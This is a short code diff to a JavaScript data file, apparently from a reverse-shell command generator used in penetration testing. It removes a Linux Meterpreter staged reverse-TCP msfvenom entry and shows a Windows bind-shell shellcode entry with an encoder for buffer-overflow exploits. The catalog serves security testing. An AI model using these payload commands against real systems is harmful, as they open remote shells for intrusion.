@@ -281,11 +281,6 @@ const msfvenomCommands =  withCommandType(
             "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
-            "name": "Linux Meterpreter Staged Reverse TCP (x64)",
-            "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf",
-            "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
-        },
-        {
             "name": "Windows Bind TCP ShellCode - BOF",
             "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode",
             "meta": ["msfvenom", "windows", "bind", "bufferoverflow"]
